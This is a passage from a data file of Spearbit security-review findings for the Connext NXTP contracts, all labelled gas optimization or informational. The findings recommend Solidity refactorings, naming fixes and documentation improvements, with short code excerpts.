{"title": "Using BridgeMessage library in BridgeFacet._sendMessage can be avoid to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The usage of BridgeMessage library to calculate _tokenId, _action, and finally the formatted mes- sage involves lots of unnecessary memory writes, redundant checks, and overall complicates understanding the flow of the codebase. The BridgeMessage.formatMessage(_tokenId, _action) value passed to IOutbox(s.xAppConnectionManager.home()).dispatch is at the end with the current implementation supposed to be: 92 abi.encodePacked( _canonical.domain, _canonical.id, BridgeMessage.Types.Transfer, _amount, _transferId ); Also, it is redundant that the BridgeMessage.Types.Transfer has been passed to dispatch. it does not add any information to the message unless dispatch also accepts other types. This also adds extra gas overhead due to memory consumption both in the origin and destination domains.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "s.aavePool can be cached to save gas in _backLoan", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "s.aavePool can be cached to save gas by only reading once from the storage.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "<= or >= when comparing a constant can be converted to < or > to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "In this context, we are doing the following comparison: X <= C // or X >= C Where X is a variable and C is a constant expression. But since the right-hand side of <= (or >=) is the constant expression C we can convert <= into < (or >= into >) to avoid extra opcode/bytecodes being produced by the compiler.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Use memory's scratch space to calculateCanonicalHash", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "calculateCanonicalHash uses abi.encode to prepare a memory chuck to calculate and return a hash value. Since only 2 words of memory are required to calculate the hash we can utilize the memory's scratch space [0x00, 0x40) for this regard. Using this approach would prevent from paying for memory expansion costs among other things.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "isLocalOrigin can be optimized by using a named return parameter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "isLocalOrigin after getting the code size of _token returns a comparison result as a bool: assembly { _codeSize := extcodesize(_token) } return _codeSize != 0; This last comparison can be avoided if we use a named return variable since the cast to bool type would automat- ically does the check for us. Currently, the check/comparison is performed twice under the hood. Note: also see issue \"Use contract.code.length\".", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "The branching decision in AmplificationUtils._getAPrecise can be removed.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "_getAPrecise uses if/else block to compare a1 to a0. This comparison is unnecessary if we use a more simplified formula to return the interpolated value of a.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Optimize increment in insert()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The increment tree.count in function insert() can be optimized. function insert(Tree storage tree, bytes32 node) internal returns (uint256) { uint256 size = tree.count + 1; ... tree.count = size; ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Optimize calculation in loop of dequeueVerified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function dequeueVerified() can be optimized in the following way: (block.number - com- mitBlock >= delay) is the same as (block.number - delay >= commitBlock ) And block.number - delay is constant so it can be calculated outside of the loop. Also (x >= y) can be replaced by (!(x < y)) or (!(y > x)) to save some gas. function dequeueVerified(Queue storage queue, uint256 delay) internal returns (bytes32[] memory) { ... for (last; last >= first; ) { uint256 commitBlock = queue.commitBlock[last]; if (block.number - commitBlock >= delay) { ... } } }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Cache array length for loops", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Fetching array length for each iteration generally consumes more gas compared to caching it in a variable.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization Diamond.sol#L35, Multicall.sol#L16, StableSwap.sol#L90, LibDi-"]}, {"title": "Use custom errors instead of encoding the error message", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "TypedMemView.sol replicates the functionality provided by custom error with arguments: (, uint256 g) = encodeHex(uint256(typeOf(memView))); (, uint256 e) = encodeHex(uint256(_expected)); string memory err = string( abi.encodePacked(\"Type assertion failed. Got 0x\", uint80(g), \". Expected 0x\", uint80(e)) ); revert(err); encodeHex() is only used to encode a variable for an error message.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Avoid OR with a zero variable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Boolean OR operation with a zero variable is a no-op. Highlighted code above perform a boolean OR operation with a zero variable which can be avoided: newView := or(newView, shr(40, shl(40, memView))) ... newView := shl(96, or(newView, _type)) // insert type ... _encoded |= _nibbleHex(_byte >> 4); // top 4 bits", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Use scratch space instead of free memory", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Memory slots 0x00 and 0x20 are scratch space. So any operation in assembly that needs at most 64 bytes of memory to write temporary data can use scratch space. Functions sha2(), hash160() and hash256() use free memory to write the intermediate hash values. The scratch space can be used here since these values fit in 32 bytes. It saves gas spent on reading the free memory pointer, and memory expansion.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Redundant checks in _processMessageFromRoot() of PolygonSpokeConnector", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function _processMessageFromRoot() of PolygonSpokeConnector does two checks on sender, which are the same: PolygonSpokeConnector.sol#L78-L82,  validateSender(sender) checks sender == fxRootTunnel  _setMirrorConnector() and setFxRootTunnel() set fxRootTunnel = _mirrorConnector and mirrorCon- nector = _mirrorConnector  require(sender == mirrorConnector, ...) checks sender == mirrorConnector which is the same as sender == fxRootTunnel. Note: the require in _setMirrorConnector() makes sure the values can't be updated later on. So one of the checks in function _processMessageFromRoot() could be removed to save some gas and to make the code easier 104 to understand. contract PolygonSpokeConnector is SpokeConnector, FxBaseChildTunnel { function _processMessageFromRoot(..., ... require(sender == mirrorConnector, \"!sender\"); ... address sender, ... ) validateSender(sender) { } function _setMirrorConnector(address _mirrorConnector) internal override { require(fxRootTunnel == address(0x0), ...); setFxRootTunnel(_mirrorConnector); } } abstract contract FxBaseChildTunnel is IFxMessageProcessor { function setFxRootTunnel(address _fxRootTunnel) public virtual { ... fxRootTunnel = _fxRootTunnel; // == _mirrorConnector } modifier validateSender(address sender) { require(sender == fxRootTunnel, ...); _; } }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization PolygonSpokeConnector.sol#L61-L74,"]}, {"title": "Consider using bitmaps in _recordOutputAsSpent() of ArbitrumHubConnector", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function _recordOutputAsSpent() stores status via a mapping of booleans. However the equiv- alent function recordOutputAsSpent() of Arbritrum Nitro uses a mapping of bitmaps to store the status. Doing this saves gas. Note: this saving is possible because the index values are neatly ordered. function _recordOutputAsSpent(..., uint256 _index, ...) ... { ... require(!processed[_index], \"spent\"); ... processed[_index] = true; } Arbitrum version: function recordOutputAsSpent(..., uint256 index, ... ) ... { ... (uint256 spentIndex, uint256 bitOffset, bytes32 replay) = _calcSpentIndexOffset(index); if (_isSpent(bitOffset, replay)) revert AlreadySpent(index); spent[spentIndex] = (replay | bytes32(1 << bitOffset)); }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "Move nonReentrant from process() to proveAndProcess()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function process() has a nonReentrant modifier. The function process() is also internal and is only called from proveAndProcess(), so it also possible to move the nonReentrant modifier to function proveAndProcess(). This would save repeatedly setting and unsetting the status of nonReentrant, which saves gas. function proveAndProcess(...) ... { ... for (uint32 i = 0; i < _proofs.length; ) { process(_proofs[i].message); unchecked { ++i; } } } function process(bytes memory _message) internal nonReentrant returns (bool _success) { ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Gas Optimization"]}, {"title": "OpenZeppelin libraries IERC20Permit and EIP712 are final", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The OpenZeppelin libraries have changed IERC20Permit and EIP712 to a final version, so the final versions can be used. OZERC20.sol import \"@openzeppelin/contracts/token/ERC20/extensions/draft-IERC20Permit.sol\"; import {EIP712} from \"@openzeppelin/contracts/utils/cryptography/draft-EIP712.sol\"; draft-IERC20Permit.sol // EIP-2612 is Final as of 2022-11-01. This file is deprecated. import \"./IERC20Permit.sol\"; draft-EIP712.sol // EIP-712 is Final as of 2022-08-11. This file is deprecated. import \"./EIP712.sol\";", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use Foundry's multi-chain tests", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Foundry supports multi-chain testing that can be useful to catch bugs earlier in the development process. Local multi-chain environment can be used to test many scenarios not possible on test chains or in production. Since Connectors are a critical part of NXTP protocol.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Risk of chain split", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Domains are considered immutable (unless implementation contracts are redeployed). In case of chain splits, both the forks will continue having the same domain and the recipients won't be able to differentiate which source chain of the message.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use zkSync's custom compiler for compiling and (integration) testing", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The protocol needs to be deployed on zkSync. For deployment, the contracts would need to be compiled with zkSync's custom compiler. The bytecode generated by the custom Solidity compiler is quite dif- ferent compared to the original compiler. One thing to note is that cryptographic functions in Solidity are being replaced/inlined to static calls to zkSync's set of system precompile contracts.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Shared logic in SwapUtilsExternal and SwapUtils can be consolidated or their changes would need to be synched.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The SwapUtilsExternal library and SwapUtils share quite a lot of functions (events/...) logics . The main differences are:  SwapUtilsExternal.swap does not have the following check but SwapUtils.swap does: // File: connext/libraries/SwapUtils.sol#L715 require(dx == tokenFrom.balanceOf(address(this)) - beforeBalance, \"no fee token support\"); This is actually one of the big/important diffs between current SwapUtils and SwapUtilsExternal. Other differ- ences are:  Some functions are internal in SwapUtils, but they are external/public in SwapUtilsExternal.  AmplificationUtils is basically copied in SwapUtilsExternal and its functions have been made external.  SwapUtilsExternal does not implement exists.  SwapUtilsExternal does not implement swapInternal.  The SwapUtils's Swap struct has an extra field key as do the events in this file.  Some inconsistent formatting. 109", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document why < 3s was chosen as the timestamp deviation cap for price reporting in setDirect- Price", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "setDirectPrice uses the following require statement to filter direct price reports by the owner. require(_timestamp - block.timestamp < 3, \"in future\"); Only prices with _timestamp within 3s of the current block timestamp are allowed to be registered.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document what IConnectorManager entities would be passed to BridgeFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Document what type of IConnectorManager implementations would the owner or an admin set for the s.xAppConnectionManager. The only examples in the codebase are SpokeConnectors.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Second nonReentrant modifier", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "A previous version of xcall() had a nonReentrant modifier. This modifier was removed to enable execute() to call xcall() to return data to the originator chain. To keep a large part of the original protec- tion it is also possible to use a separate nonReentrant modifier (which uses a different storage variable) for xcall()/xcallIntoLocal(). This way both execute and xcall()/xcallIntoLocal() can be called once at the most. function xcall(...) ... { } function xcallIntoLocal(...) ... { } function execute(ExecuteArgs calldata _args) external nonReentrant whenNotPaused returns (bytes32) { }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Return 0 in swapToLocalAssetIfNeeded()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The return in function swapToLocalAssetIfNeeded() could also return 0. Which is somewhat more readable and could save some gas. Note: after studying the compiler output it might not actually save gas. 111 function swapToLocalAssetIfNeeded(...) ... { if (_amount == 0) { return _amount; } ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use contract.code.length", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Retrieving the size of a contract is done in assembly, with extcodesize(). This can also be done in solidity which is more readable. Note: assembly might be a bit more gas efficient, especially if optimized even further: see issue \"isLocalOrigin can be optimized by using a named return parameter\". LibDiamond.sol function enforceHasContractCode(address _contract, string memory _errorMessage) internal view { uint256 contractSize; assembly { contractSize := extcodesize(_contract) } require(contractSize != 0, _errorMessage); } AssetLogic.sol function isLocalOrigin(address _token, AppStorage storage s) internal view returns (bool) { ... uint256 _codeSize; // solhint-disable-next-line no-inline-assembly assembly { _codeSize := extcodesize(_token) } return _codeSize != 0; }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "cap and liquidity tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function addLiquidity() also adds tokens to the Connext Diamond contract. If these tokens are the same as canonical tokens it wouldn't play nicely with the cap on these tokens. For others tokens it might also be relevant to have a cap. function addLiquidity(...) ... { ... token.safeTransferFrom(msg.sender, address(this), amounts[i]); ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Simplify _swapAssetOut()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function _swapAssetOut() has relative complex logic where it first checks the tokens that will be received and then preforms a swap. It prevents reverting by setting the success flag. However function repayAave- Portal() still reverts if this flag is set. The comments show this was meant for reconcile(), however repaying the Aave dept in the reconcile phase no longer exists. So _swapAssetOut() could just revert if insufficiently tokens are provided. This way it would also be more similar to _swapAsset(). This will make the code more readable and safe some gas. AssetLogic.sol 113 function _swapAssetOut(...) ... returns ( bool success, ...) { ... if (ipool.exists()) { ... // Calculate slippage before performing swap. // NOTE: This is less efficient then relying on the `swapInternalOut` revert, but makes it ,! easier // to handle slippage failures (this can be called during reconcile, so must not fail). ... if (_maxIn >= ipool.calculateSwapInv(tokenIndexIn, tokenIndexOut, _amountOut)) { success = true; amountIn = ipool.swapInternalOut(tokenIndexIn, tokenIndexOut, _amountOut, _maxIn); } } else { ... uint256 _amountIn = pool.calculateSwapOutFromAddress(_assetIn, _assetOut, _amountOut); if (_amountIn <= _maxIn) { success = true; ... amountIn = pool.swapExactOut(_amountOut, _assetIn, _assetOut, _maxIn, block.timestamp + ,! 3600); } } } function swapFromLocalAssetIfNeededForExactOut(...) { ... return _swapAssetOut(_key, _asset, adopted, _amount, _maxIn); } PortalFacet.sol function repayAavePortal(...) { ... (bool success, ..., ...) = AssetLogic.swapFromLocalAssetIfNeededForExactOut(...); if (!success) revert PortalFacet__repayAavePortal_swapFailed(); ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Return default false in the function end", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "verify function is missing a default return value. A return value of false can be added on the function end", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Change occurances of whitelist to allowlist", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "In the codebase, whitelist is used to represent entities or objects that are allowed to be used or perform certain tasks. This word is not so accurate/suggestive and also can be offensive.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Incorrect comment on _mirrorConnector", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The comment on _mirrorConnector is incorrect as this does not denote address of the spoke connector", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "addStableSwapPool can have a more suggestive name and also better documentation for the _- stableSwapPool input parameter is recommended", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "1. The name suggests we are adding a new pool, although we are replacing/updating the current one. 2. _stableSwapPool needs to implement IStableSwap and it is supposed to be an external stable swap pool. It would be best to indicate that and possibly change the parameter input type to IStableSwap _stableSwap- Pool. 3. _stableSwapPool provided by the owner or an admin can have more than just 2 tokens as the @notice comment suggests. For example, the pool could have oUSDC, nextUSDC, oDAI, nextDAI, ... . Also there are no guarantees that the pooled tokens are pegged to each other. There is also a potential of having these pools have malicious or worthless tokens. What external pools does Connext team uses or is planning to use? This comment also applies to setupAsset and setupAssetWithDeployedRepresentation.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "_local has a misleading name in _addLiquidityForRouter and _removeLiquidityForRouter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The name for _local parameter is misleading, since it has been used in _addLiquidityForRouter (TokenId memory canonical, bytes32 key) = _getApprovedCanonicalId(_local); and in _removeLiquidityForRouter TokenId memory canonical = _getCanonicalTokenId(_local); and we have the following call flow path: AssetLogic.getCanonicalTokenId uses the adoptedToCanonical mapping first then check if the input parameter is a canonical token for the current domain, then uses representationToCanonical mapping. So here _local could be an adopted token.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document _calculateSwap's and _calculateSwapInv's calculations", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "In _calculateSwap, the -1 in dy = xp[tokenIndexTo] - y - 1 is actually important. This is be- cause given no change in the asset balance of all tokens that already satisfy the stable swap invariant (dx = 0), getY (due to rounding errors) might return:  y = xp[tokenIndexTo] which would in turn make dy = -1 that would revert the call. This case would need to be investigated.  y = xp[tokenIndexTo] - 1 which would in turn make dy = 0 and so the call would return (0, 0).  y = xp[tokenIndexTo] + 1 which would in turn make dy = -2 that would revert the call. This case would need to be investigated. 117 And similiarly in _calculateSwapInv, doing the same analysis for + 1 in dx = x - xp[tokenIndexFrom] + 1, if getYD returns:  xp[tokenIndexFrom] +1, then dx = 2;  xp[tokenIndexFrom], then dx = 1;  xp[tokenIndexFrom] - 1, then dx = 0; Note, that the behavior is different and the call would never revert.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Providing the from amount the same as the pool's from token balance, one might get a different return value compared to the current pool's to balance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Note, due to some imbalance in the asset pool, given x = xp[tokenIndexFrom] (aka, no change in asset balance of tokenIndexFrom token in the asset pool), we might see a decrease or increase in the asset balance of tokenIndexTo to bring back the pool to satisfying the stable swap invariant. One source that can introduce an imbalance is when the scaled amplification coefficient is ramping.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Document what type 0 means for TypedMemView", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "In the following line, 0 is passed as the new type for a TypedMemView bytes29 _message.slice(PREFIX_LENGTH, _message.len() - PREFIX_LENGTH, 0) But there is no documentation as to what type 0 signifies.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Mixed use of require statements and custom errors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The codebase includes a mix of require statements and custom errors.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "WatcherManager can make watchers public instead of having a getter function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "WatcherManager has a private mapping watchers and a getter function isWatcher() to query that mapping. Since WatcherManager is not inherited by any other contract, it is safe to make it public to avoid the need of an explicit getter function.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Incorrect comment about relation between zero amount and asset", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "At BridgeFacet.sol#L514, if _amount == 0, _asset is allowed to have any user-specified value. _- xcall() reverts when zero address is specified for _asset on a non-zero _amount: if (_asset == address(0) && _amount != 0) { revert BridgeFacet__xcall_nativeAssetNotSupported(); } However, according to this comment if amount is 0, _asset also has to be the zero address which is not true (since it uses IFF): _params.normalizedIn = _asset == address(0) ? 0 // we know from assertions above this is the case IFF amount == 0 : AssetLogic.normalizeDecimals(ERC20(_asset).decimals(), uint8(18), _amount);", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "New Connector needs to be deployed if AMB changes", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The AMB address is configured to be immutable. If any of the chain's AMB changes, the Connector needs to be deployed. /** * @notice Address of the AMB on this domain. */ address public immutable AMB;", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Functions should be renamed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The following functions should be renamed to be aligned with the naming convention of the fxPortal contracts.  OptimismHubConnector.processMessageFromRoot to OptimismHubConnector.processMessageFromChild  ArbitrumHubConnector.processMessageFromRoot to ArbitrumHubConnector.processMessageFromChild  ZkSyncHubConnector.processMessageFromRoot to ZkSyncHubConnector.processMessageFromChild", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Twice function aggregate()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Both the contracts Multicall and RootManager have a function called aggregate(). This could be confusing. Contract Multicall doesn't seem to be used. Multicall.sol function aggregate(Call[] memory calls) public view returns (uint256 blockNumber, bytes[] memory returnData) { ... ,! } RootManager.sol 120 function aggregate(uint32 _domain, bytes32 _inbound) external whenNotPaused onlyConnector(_domain) { ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Careful when using _removeAssetId()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function _removeAssetId() removes an assets. Although it is called via authorized functions, mistakes could be made. It there are any representation assets left, they are worthless as they can't be bridged back anymore (unless reinstated via setupAssetWithDeployedRepresentation()). The representation assets might also be present and allowed in the StableSwap. If so, the owners of the worthless tokens could quickly swap them for real tokens. The canonical tokens will also be locked. function _removeAssetId(...) ... { ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Unused import IAavePool in InboxFacet", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Contract InboxFacet imports IAavePool, however it doesn't use it. import {IAavePool} from \"../interfaces/IAavePool.sol\";", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use IERC20Metadata", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "interface. pelin/contracts/token/ERC20/extensions/IERC20Metadata.sol, which seems more logical. BridgeFacet.sol import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; ... function _xcall(...) ... { ... ... AssetLogic.normalizeDecimals(ERC20(_asset).decimals(), uint8(18), _amount); ... } AssetLogic.sol import {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"; ... function swapToLocalAssetIfNeeded(...) ... { ... ... calculateSlippageBoundary(ERC20(_asset).decimals(), ERC20(_local).decimals(), _amount, _slippage) ... ... ,! } function swapFromLocalAssetIfNeeded(...) ... { ... ... calculateSlippageBoundary(uint8(18), ERC20(adopted).decimals(), _normalizedIn, _slippage) ... ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Generic name of proposedTimestamp()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The function proposedTimestamp() has a very generic name. As there are other Timestamp func- tions this might be confusing. function proposedTimestamp() public view returns (uint256) { return s._proposedOwnershipTimestamp; } function routerWhitelistTimestamp() public view returns (uint256) { return s._routerWhitelistTimestamp; } function assetWhitelistTimestamp() public view returns (uint256) { return s._assetWhitelistTimestamp; }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Two different nonces", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "Both LibConnextStorage and SpokeConnector define a nonce. As the names are very similar this could be confusing. LibConnextStorage.sol struct AppStorage { ... * @notice Nonce for the contract, used to keep unique transfer ids. * @dev Assigned at first interaction (xcall on origin domain). uint256 nonce; ... } SpokeConnector.sol * @notice domain => next available nonce for the domain. mapping(uint32 => uint32) public nonces;", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Tips to optimize rootWithCtx", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "To help with the optimization mentioned in the comment of rootWithCtx(), here is a way to count the trailing 0s: graphics.stanford.edu/~seander/bithacks.html#ZerosOnRightModLookup. function rootWithCtx(Tree storage tree, bytes32[TREE_DEPTH] memory _zeroes) internal view returns (bytes32 _current) { ... // TODO: Optimization: skip the first N loops where the ith bits are all 0 - start at that // depth with zero hashes. ... ,! }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Use delete", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "The functions _setOwner() and removeRouter() clear values by setting them to 0. Other parts of the code use delete. So using delete here too would be more consistent. ProposedOwnable.sol function _setOwner(address newOwner) internal { ... _proposedOwnershipTimestamp = 0; _proposed = address(0); ... } RoutersFacet.sol function removeRouter(address router) external onlyOwnerOrRouter { ... s.routerPermissionInfo.routerOwners[router] = address(0); ... s.routerPermissionInfo.routerRecipients[router] = address(0); ... }", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "replace usages of abi.encodeWithSignature and abi.encodeWithSelector with abi.encodeCall to ensure typo and type safety", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": " When abi.encodeWithSignature is used the compiler does not check for mistakes in the signature or the types provided.  When abi.encodeWithSelector is used the compiler does not check for parameter type inconsistencies.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "setAggregators is missing checks against address(0)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "setAggregators does not check if tokenAddresses[i] or sources[i] is address(0).", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "setAggregators can be simplified", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "setAggregators does not check if tokenAddresses length is equal to sources to revert early.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Event is not emitted when an important action happens on-chain", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "No event is emitted when an important action happens on-chain.", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Add unit/fuzz tests to make sure edge cases would not cause an issue in Queue._length", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "It is always assumed last + 1 >= first. It would be great to add unit/fuzz tests to check for this invariant. Adding these tests", "labels": ["Spearbit", "ConnextNxtp", "Severity: Informational"]}, {"title": "Consider using prefix(...) instead of slice(0,...)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ConnextNxtp-Spearbit-Security-Review.pdf", "body": "tokenId() calls TypedMemView.slice() function to slice the first few bytes from _message: return _message.slice(0, TOKEN_ID_LEN, uint40(Types.TokenId)); TypedMemView.prefix() can also be used here since it achieves the same goal.", "labels": ["Spearbit", 